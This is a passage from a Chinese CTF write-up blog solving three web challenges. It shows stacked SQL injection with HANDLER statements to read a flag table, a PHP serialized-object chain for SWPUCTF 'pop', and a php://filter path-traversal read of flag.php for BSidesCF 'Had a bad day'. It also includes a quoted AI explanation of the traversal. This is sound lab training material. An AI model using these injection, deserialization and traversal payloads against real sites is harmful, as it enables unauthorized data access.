class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;hahahah&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;FlagHere&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;words&quot;</span><br>&#125;<br><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-variable">show</span> <span class="hljs-variable">colums</span> <span class="hljs-variable">from</span> <span class="hljs-title class_">FlagHere</span>;#<br>不回显<br><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-variable">HANDLER</span> <span class="hljs-title class_">FlagHere</span> <span class="hljs-variable">OPEN</span>;<span class="hljs-variable">HANDLER</span> <span class="hljs-title class_">FlagHere</span> <span class="hljs-variable">READ</span> <span class="hljs-variable">FIRST</span>;<span class="hljs-variable">HANDLER</span> <span class="hljs-title class_">FlagHere</span> <span class="hljs-variable">CLOSE</span>;<br>或者<br><span class="hljs-number">1</span>&#x27;;<span class="hljs-variable">HANDLER</span> <span class="hljs-title class_">FlagHere</span> <span class="hljs-variable">OPEN</span>;<span class="hljs-variable">HANDLER</span> <span class="hljs-title class_">FlagHere</span> <span class="hljs-variable">READ</span> <span class="hljs-variable">FIRST</span>;<br><span class="hljs-comment">//flag&#123;0bc2fe53-291d-4d3d-9a1c-adc6d658396e&#125;</span><br></code></pre></td></tr></table></figure><p>不说了，原题是2019网鼎杯 随便注，限制了重命名和预编译解法，但是能用handler，复制粘贴payload即可解。。。</p><h1 id="SWPUCTF-2021-新生赛-pop"><a href="#SWPUCTF-2021-新生赛-pop" class="headerlink" title="[SWPUCTF 2021 新生赛]pop"></a>[SWPUCTF 2021 新生赛]pop</h1><p>以前的题，做了好久，看了一眼以前的wp，加上AreUSerialz，以后除了public类还是直接在原来的class里直接赋值的好，不然一直出问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;index.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;w44m&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;08067&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd ===<span class="hljs-string">&#x27;08067&#x27;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nono&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;w00m;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;w22m&#125;();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w22m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w33m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m-&gt;w00m=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w44m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m-&gt;w22m=<span class="hljs-string">&#x27;Getflag&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>拿到题目，可以看到这能提供猫猫和狗狗的图片，随便选一个  </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/index.php?<span class="hljs-attribute">category</span>=woofers<br></code></pre></td></tr></table></figure><p>fuzz一下  </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/<span class="hljs-keyword">index</span>.php?category=woofers;ls<br><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(woofers;ls.php): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: <span class="hljs-keyword">No</span> such file <span class="hljs-keyword">or</span> directory <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(): Failed opening <span class="hljs-string">&#x27;woofers;ls.php&#x27;</span> <span class="hljs-keyword">for</span> inclusion (include_path=<span class="hljs-string">&#x27;.:/usr/local/lib/php&#x27;</span>) <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br><br>/<span class="hljs-keyword">index</span>.php?category=<span class="hljs-keyword">index</span><br><br>Sorry, we currently <span class="hljs-keyword">only</span> support woofers <span class="hljs-keyword">and</span> meowers.<br><br>/<span class="hljs-keyword">index</span>.php?category=meowers;flag<br><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(meowers;flag.php): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: <span class="hljs-keyword">No</span> such file <span class="hljs-keyword">or</span> directory <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(): Failed opening <span class="hljs-string">&#x27;meowers;flag.php&#x27;</span> <span class="hljs-keyword">for</span> inclusion (include_path=<span class="hljs-string">&#x27;.:/usr/local/lib/php&#x27;</span>) <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br></code></pre></td></tr></table></figure><p>一般这种有include函数的可以试试伪协议,然后刚才就有站点目录了，试一下目录穿越看看flag是否在根目录<br>然后若是没有那个目录会返回：<br>Sorry, we currently only support woofers and meowers.  </p><p>然后就是能用<br>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index<br>来返回index文件的base64<br>注意到源码里会自动给它加上.php  </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/<span class="hljs-keyword">index</span>.php?category=php://<span class="hljs-keyword">filter</span>/convert.base64-encode/resource=<span class="hljs-keyword">index</span>.php<br><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(php://<span class="hljs-keyword">filter</span>/convert.base64-encode/resource=<span class="hljs-keyword">index</span>.php.php): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: operation failed <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(): Failed opening <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=index.php.php&#x27;</span> <span class="hljs-keyword">for</span> inclusion (include_path=<span class="hljs-string">&#x27;.:/usr/local/lib/php&#x27;</span>) <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br></code></pre></td></tr></table></figure><p>到现在能想到的是想办法目录穿越到根目录下读取flag，  </p><p>先是  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/index.php?category=php://filter/convert.base64-encode/resource=index.php<br></code></pre></td></tr></table></figure><p>拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> content=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;description&quot;</span> content=<span class="hljs-string">&quot;Images that spark joy&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0&quot;</span>&gt;<br>    &lt;title&gt;Had a bad day?&lt;/title&gt;<br>    &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/material.min.css&quot;</span>&gt;<br>    &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/style.css&quot;</span>&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">layout</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">layout</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">layout</span>--<span class="hljs-title">fixed</span>-<span class="hljs-title">header</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">js</span>-<span class="hljs-title">layout</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>--<span class="hljs-title">grey</span>-100&quot;&gt;</span><br><span class="hljs-class">      &lt;<span class="hljs-title">header</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">header</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">layout__header</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">layout__header</span>--<span class="hljs-title">scroll</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>--<span class="hljs-title">grey</span>-100 <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>-<span class="hljs-title">text</span>--<span class="hljs-title">grey</span>-800&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">layout__header</span>-<span class="hljs-title">row</span>&quot;&gt;</span><br><span class="hljs-class">          &lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">layout</span>-<span class="hljs-title">title</span>&quot;&gt;<span class="hljs-title">Had</span> <span class="hljs-title">a</span> <span class="hljs-title">bad</span> <span class="hljs-title">day</span>?&lt;/<span class="hljs-title">span</span>&gt;</span><br><span class="hljs-class">          &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">layout</span>-<span class="hljs-title">spacer</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">      &lt;/<span class="hljs-title">header</span>&gt;</span><br><span class="hljs-class">      &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">ribbon</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">      &lt;<span class="hljs-title">main</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">main</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">layout__content</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">container</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">grid</span>&quot;&gt;</span><br><span class="hljs-class">          &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span>--2-<span class="hljs-title">col</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span>--<span class="hljs-title">hide</span>-<span class="hljs-title">tablet</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span>--<span class="hljs-title">hide</span>-<span class="hljs-title">phone</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">          &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">content</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>--<span class="hljs-title">white</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">shadow</span>--4<span class="hljs-title">dp</span> <span class="hljs-title">content</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>-<span class="hljs-title">text</span>--<span class="hljs-title">grey</span>-800 <span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">cell</span>--8-<span class="hljs-title">col</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">crumbs</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">color</span>-<span class="hljs-title">text</span>--<span class="hljs-title">grey</span>-500&quot;&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">h3</span>&gt;<span class="hljs-title">Cheer</span> <span class="hljs-title">up</span>!&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class">              &lt;<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">                <span class="hljs-title">Did</span> <span class="hljs-title">you</span> <span class="hljs-title">have</span> <span class="hljs-title">a</span> <span class="hljs-title">bad</span> <span class="hljs-title">day</span>? <span class="hljs-title">Did</span> <span class="hljs-title">things</span> <span class="hljs-title">not</span> <span class="hljs-title">go</span> <span class="hljs-title">your</span> <span class="hljs-title">way</span> <span class="hljs-title">today</span>? <span class="hljs-title">Are</span> <span class="hljs-title">you</span> <span class="hljs-title">feeling</span> <span class="hljs-title">down</span>? <span class="hljs-title">Pick</span> <span class="hljs-title">an</span> <span class="hljs-title">option</span> <span class="hljs-title">and</span> <span class="hljs-title">let</span> <span class="hljs-title">the</span> <span class="hljs-title">adorable</span> <span class="hljs-title">images</span> <span class="hljs-title">cheer</span> <span class="hljs-title">you</span> <span class="hljs-title">up</span>!</span><br><span class="hljs-class">              &lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">              &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">include</span>&quot;&gt;</span><br><span class="hljs-class">              &lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class">$<span class="hljs-title">file</span> = $<span class="hljs-title">_GET</span>[&#x27;<span class="hljs-title">category</span>&#x27;];</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">if</span>(<span class="hljs-title">isset</span>($<span class="hljs-title">file</span>))</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;woofers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;meowers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))  <span class="hljs-comment">//要有匹配的字符才能进到下一步的include函数</span><br><span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;/div&gt;<br>          &lt;form action=<span class="hljs-string">&quot;index.php&quot;</span> method=<span class="hljs-string">&quot;get&quot;</span> id=<span class="hljs-string">&quot;choice&quot;</span>&gt;<br>              &lt;center&gt;&lt;button onclick=<span class="hljs-string">&quot;document.getElementById(&#x27;choice&#x27;).submit();&quot;</span> name=<span class="hljs-string">&quot;category&quot;</span> value=<span class="hljs-string">&quot;woofers&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">button</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">button</span>--<span class="hljs-title">colored</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">button</span>--<span class="hljs-title">raised</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">js</span>-<span class="hljs-title">button</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">js</span>-<span class="hljs-title">ripple</span>-<span class="hljs-title">effect</span>&quot; <span class="hljs-title">data</span>-<span class="hljs-title">upgraded</span>=&quot;,<span class="hljs-title">MaterialButton</span>,<span class="hljs-title">MaterialRipple</span>&quot;&gt;<span class="hljs-title">Woofers</span>&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">button__ripple</span>-<span class="hljs-title">container</span>&quot;&gt;&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">ripple</span> <span class="hljs-title">is</span>-<span class="hljs-title">animating</span>&quot; <span class="hljs-title">style</span>=&quot;<span class="hljs-title">width</span>: 189.356<span class="hljs-title">px</span>; <span class="hljs-title">height</span>: 189.356<span class="hljs-title">px</span>; <span class="hljs-title">transform</span>: <span class="hljs-title">translate</span>(-50%, -50%) <span class="hljs-title">translate</span>(31<span class="hljs-title">px</span>, 25<span class="hljs-title">px</span>);&quot;&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">              &lt;<span class="hljs-title">button</span> <span class="hljs-title">onclick</span>=&quot;<span class="hljs-title">document</span>.<span class="hljs-title">getElementById</span>(&#x27;<span class="hljs-title">choice</span>&#x27;).<span class="hljs-title">submit</span>();&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">category</span>&quot; <span class="hljs-title">value</span>=&quot;<span class="hljs-title">meowers</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">button</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">button</span>--<span class="hljs-title">colored</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">button</span>--<span class="hljs-title">raised</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">js</span>-<span class="hljs-title">button</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">js</span>-<span class="hljs-title">ripple</span>-<span class="hljs-title">effect</span>&quot; <span class="hljs-title">data</span>-<span class="hljs-title">upgraded</span>=&quot;,<span class="hljs-title">MaterialButton</span>,<span class="hljs-title">MaterialRipple</span>&quot;&gt;<span class="hljs-title">Meowers</span>&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">button__ripple</span>-<span class="hljs-title">container</span>&quot;&gt;&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mdl</span>-<span class="hljs-title">ripple</span> <span class="hljs-title">is</span>-<span class="hljs-title">animating</span>&quot; <span class="hljs-title">style</span>=&quot;<span class="hljs-title">width</span>: 189.356<span class="hljs-title">px</span>; <span class="hljs-title">height</span>: 189.356<span class="hljs-title">px</span>; <span class="hljs-title">transform</span>: <span class="hljs-title">translate</span>(-50%, -50%) <span class="hljs-title">translate</span>(31<span class="hljs-title">px</span>, 25<span class="hljs-title">px</span>);&quot;&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;/<span class="hljs-title">button</span>&gt;&lt;/<span class="hljs-title">center</span>&gt;</span><br><span class="hljs-class">          &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">          &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">      &lt;/<span class="hljs-title">main</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">material</span>.<span class="hljs-title">min</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">  &lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>strpos()函数，匹配对应字符  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://512acbf5-c929-427e-aec6-d35d2e44994c.node5.buuoj.cn:81/flag.php<br><br><span class="hljs-comment">&lt;!-- Can you read this flag? --&gt;</span><br></code></pre></td></tr></table></figure><p>页面未返回404，说明flag就在站点默认目录下，并且是.php后缀<br>加上提示，就需要读取flag.php源码，<br>所以解法是利用index.php?category&#x3D;<br>里的include函数，使用伪协议编码读取flag.php的源码  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=woofers<span class="hljs-regexp">/../</span>flag<br><br>解码得到flag  <br></code></pre></td></tr></table></figure><h2 id="notice-php的include函数访问目录解析："><a href="#notice-php的include函数访问目录解析：" class="headerlink" title="notice php的include函数访问目录解析："></a>notice php的include函数访问目录解析：</h2><p>kimi:<br>PHP的include函数在解析文件路径时会进行路径标准化，会按文件路径中的..&#x2F;进行目录跳转，即使没有实际的woofers文件目录。  </p><p>当woofers&#x2F;..&#x2F;flag.php被传入并交给include函数时，PHP会将其解析为flag.php，因为在路径解析过程中，..&#x2F;会跳过前面的woofers目录，最终只剩下flag.php，这也就导致了没有woofers文件目录的情况下也能解析到flag.php。  </p><p>为了防止这种情况，你应该对传入的文件名进行严格过滤和验证，避免包含目录跳转等特殊字符，只允许包含合法的文件名字符，确保传入的文件名符合预期的文件目录结构，并使用且绝对路径或限制目录范围等措施，来防止这种路径解析问题导致的安全风险。  </p><p>q:<br>听不懂，意思..&#x2F;解析的优先级大吗?</p><p>kimi:<br>在路径解析中，..&#x2F;的作用是返回上一级目录，它不是优先级的问题，而是一个路径解析的逻辑。<br>路径解析的逻辑:</p><blockquote><p>当 PHP 处理文件路径时，它是按照路径的逻辑来解析的。例如，对于路径woofers&#x2F;..&#x2F;flag.php，PHP 会先看到woofers目录，然后遇到..&#x2F;，这意味着要回到上一级目录。最后，再访问flag.php文件。<br>这个过程可以类比于你在文件系统中手动导航目录。假设你当前在某个目录下，先进入woofers子目录，然后又返回上一级目录（通过..&#x2F;），此时你又回到了原来的位置，接着再访问flag.php文件。<br>所以，在路径解析中，..&#x2F;会改变当前路径的逻辑位置，而不管文件系统中实际的目录是否存在。  </p></blockquote><p>为什么没有woofers目录也能解析:  </p><blockquote><p>PHP 在解析路径时，并不是先检查路径中的每个目录是否存在，而是先按照路径的逻辑进行标准化处理。<br>在路径woofers&#x2F;..&#x2F;flag.php中，woofers和..&#x2F;相互抵消，最终得到的路径是flag.php。PHP 会尝试去包含这个flag.php文件，不管前面的woofers目录是否存在。<br>这就好比你在数学中进行运算，5 + 3 - 3的结果是 5，中间的加和减操作是按照运算逻辑进行的，不管中间的数字是否代表实际存在的东西。<br>这种路径解析机制在 PHP 中是比较常见的，它允许灵活地引用文件，但也可能导致安全问题，如目录遍历攻击，这就是为什么需要对用户输入的文件名进行严格过滤和验证的原因。  </p></blockquote><p>我想大概意思就是会先解析完目录，再去访问目录是否存在，所以它是先解析完<br>woofers&#x2F;..&#x2F;flag.php  &#x3D;<br>&#x2F;flag<br>再去访问解析完的目录，而不会在解析时去访问woofers目录</p><h1 id="RoarCTF-2019-Easy-Java"><a 